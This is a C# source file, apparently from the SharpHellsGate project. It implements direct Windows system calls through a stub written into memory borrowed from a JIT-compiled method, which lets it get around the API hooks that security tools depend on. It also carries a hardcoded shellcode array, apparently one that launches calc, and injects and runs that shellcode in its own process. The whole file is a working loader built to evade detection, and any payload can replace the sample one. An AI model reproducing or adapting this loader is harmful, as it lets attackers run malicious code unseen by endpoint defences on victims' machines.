using System;
using SharpHellsGate.Win32;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.CompilerServices;

namespace SharpHellsGate {
    public class HellsGate {
        private bool IsGateReady { get; set; } = false;
        private object Mutant { get; set; } = new object();
        private Dictionary<UInt64, Util.APITableEntry> APITable { get; set; } = new Dictionary<ulong, Util.APITableEntry>() { };
        private IntPtr MangedMethodAddress { get; set; } = IntPtr.Zero;
        private IntPtr UnmanagedMethodAddress { get; set; } = IntPtr.Zero;


        [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
        private static UInt32 Gate() {
            return new UInt32();
        }

        private T NtInvocation<T>(Int16 syscall) where T: Delegate {
            if (!this.IsGateReady || this.UnmanagedMethodAddress == IntPtr.Zero) {
                Util.LogError("Unable to inject system call stub");
                return default;
            }

            Span<byte> stub = stackalloc byte[24] {
                0x4c, 0x8b, 0xd1,                                      // mov  r10, rcx
                0xb8, (byte)syscall, (byte)(syscall >> 8), 0x00, 0x00, // mov  eax, <syscall
                0xf6, 0x04, 0x25, 0x08, 0x03, 0xfe, 0x7f, 0x01,        // test byte ptr [SharedUserData+0x308],1
                0x75, 0x03,                                            // jne  ntdll!<function>+0x15
                0x0f, 0x05,                                            // syscall
                0xc3,                                                  // ret
                0xcd, 0x2e,                                            // int  2Eh
                0xc3                                                   // ret
            };

            Marshal.Copy(stub.ToArray(), 0, this.UnmanagedMethodAddress, stub.Length);
            return Marshal.GetDelegateForFunctionPointer<T>(this.UnmanagedMethodAddress);
        }
        
        private UInt32 NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect) {
            lock (this.Mutant) {
                Int16 syscall = this.APITable[Util.NtAllocateVirtualMemoryHash].Syscall;
                if (syscall == 0x0000)
                    return Macros.STATUS_UNSUCCESSFUL;

                DFunctions.NtAllocateVirtualMemory Func = NtInvocation<DFunctions.NtAllocateVirtualMemory>(syscall);
                return Func(ProcessHandle, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
            }
        }

        private UInt32 NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 OldAccessProtection) {
            lock (this.Mutant) {
                Int16 syscall = this.APITable[Util.NtProtectVirtualMemoryHash].Syscall;
                if (syscall == 0x0000)
                    return Macros.STATUS_UNSUCCESSFUL;

                DFunctions.NtProtectVirtualMemory Func = NtInvocation<DFunctions.NtProtectVirtualMemory>(syscall);
                return Func(ProcessHandle, ref BaseAddress, ref NumberOfBytesToProtect, NewAccessProtection, out OldAccessProtection);
            }
        }

        private UInt32 NtCreateThreadEx(ref IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer) {
            lock (this.Mutant) {
                Int16 syscall = this.APITable[Util.NtCreateThreadExHash].Syscall;
                if (syscall == 0x0000)
                    return Macros.STATUS_UNSUCCESSFUL;

                DFunctions.NtCreateThreadEx Func = NtInvocation<DFunctions.NtCreateThreadEx>(syscall);
                return Func(ref hThread, DesiredAccess, ObjectAttributes, ProcessHandle, lpStartAddress, lpParameter, CreateSuspended, StackZeroBits, SizeOfStackCommit, SizeOfStackReserve, lpBytesBuffer);
            }
        }

        private UInt32 NtWaitForSingleObject(IntPtr ObjectHandle, bool Alertable, ref Structures.LARGE_INTEGER TimeOuts) {
            lock (this.Mutant) {
                Int16 syscall = this.APITable[Util.NtWaitForSingleObjectHash].Syscall;
                if (syscall == 0x0000)
                    return Macros.STATUS_UNSUCCESSFUL;

                DFunctions.NtWaitForSingleObject Func = NtInvocation<DFunctions.NtWaitForSingleObject>(syscall);
                return Func(ObjectHandle, Alertable, ref TimeOuts);
            }
        }

        /// <summary>
        /// .ctor
        /// </summary>
        /// <param name="Table">The API table that will be used by the multiple function wrapers.</param>
        public HellsGate(Dictionary<UInt64, Util.APITableEntry> Table) {
            this.APITable = Table;
        }

        /// <summary>
        /// JIT a static method to generate RWX memory segment.
        /// </summary>
        /// <returns>Whether the memory segment was successfuly generated.</returns>
        public bool GenerateRWXMemorySegment() {
            // Find and JIT the method
            MethodInfo method = typeof(HellsGate).GetMethod(nameof(Gate), BindingFlags.Static | BindingFlags.NonPublic);
            if (method == null) {
                Util.LogError("Unable to find the method");
                return false;
            }
            RuntimeHelpers.PrepareMethod(method.MethodHandle);

            // Get the address of the function and check if first opcode == JMP
            IntPtr pMethod = method.MethodHandle.GetFunctionPointer();
            if (Marshal.ReadByte(pMethod) != 0xe9) {
                Util.LogError("Method was not JIT'ed or invalid stub");
                return false;
            }
            Util.LogInfo($"Managed method address:   0x{pMethod:x16}");

            // Get address of jited method and stack alignment 
            Int32 offset = Marshal.ReadInt32(pMethod, 1);
            UInt64 addr = (UInt64)pMethod + (UInt64)offset;
            while (addr % 16 != 0)
                addr++;
            Util.LogInfo($"Unmanaged method address: 0x{addr:x16}\n");

            this.MangedMethodAddress = method.MethodHandle.GetFunctionPointer();
            this.UnmanagedMethodAddress = (IntPtr)addr;
            this.IsGateReady = true;
            return true;
        }

        /// <summary>
        /// Payload example. In this case this is a basic shellcode self-injection.
        /// </summary>
        public void Payload() {
            if (!this.IsGateReady) {
                if (!this.GenerateRWXMemorySegment()) {
                    Util.LogError("Unable to generate RX memory segment");
                    return;
                }
            }

            byte[] shellcode = new byte[273] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
                0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
                0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
                0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
                0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
                0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
                0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
                0x63,0x00,0xc3
            };
            Util.LogInfo($"Shellcode size: {shellcode.Length} bytes");

            // Allocate Memory
            IntPtr pBaseAddres = IntPtr.Zero;
            IntPtr Region = (IntPtr)shellcode.Length;
            UInt32 ntstatus = NtAllocateVirtualMemory(Macros.GetCurrentProcess(), ref pBaseAddres, IntPtr.Zero, ref Region, Macros.MEM_COMMIT | Macros.MEM_RESERVE, Macros.PAGE_READWRITE);
            if (!Macros.NT_SUCCESS(ntstatus)) {
                Util.LogError($"Error ntdll!NtAllocateVirtualMemory (0x{ntstatus:0x8})");
                return;
            }
            Util.LogInfo($"Page address:   0x{pBaseAddres:x16}");

            // Copy Memory
            Marshal.Copy(shellcode, 0, pBaseAddres, shellcode.Length);
            Array.Clear(shellcode, 0, shellcode.Length);

            // Change memory protection
            UInt32 OldAccessProtection = 0;
            ntstatus = NtProtectVirtualMemory(Macros.GetCurrentProcess(), ref pBaseAddres, ref Region, Macros.PAGE_EXECUTE_READ, ref OldAccessProtection);
            if (!Macros.NT_SUCCESS(ntstatus) || OldAccessProtection != 0x0004) {
                Util.LogError($"Error ntdll!NtProtectVirtualMemory (0x{ntstatus:0x8})");
                return;
            }

            IntPtr hThread = IntPtr.Zero;
            ntstatus = NtCreateThreadEx(ref hThread, 0x1FFFFF, IntPtr.Zero, Macros.GetCurrentProcess(), pBaseAddres, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            if (!Macros.NT_SUCCESS(ntstatus) || hThread == IntPtr.Zero) {
                Util.LogError($"Error ntdll!NtCreateThreadEx (0x{ntstatus:0x8})");
                return;
            }
            Util.LogInfo($"Thread handle:  0x{hThread:x16}\n");

            // Wait for one second
            Structures.LARGE_INTEGER TimeOut = new Structures.LARGE_INTEGER();
            TimeOut.QuadPart = -10000000;
            ntstatus = NtWaitForSingleObject(hThread, false, ref TimeOut);
            if (ntstatus != 0x00) {
                Util.LogError($"Error ntdll!NtWaitForSingleObject (0x{ntstatus:0x8})");
                return;
            }
        }
    }
}
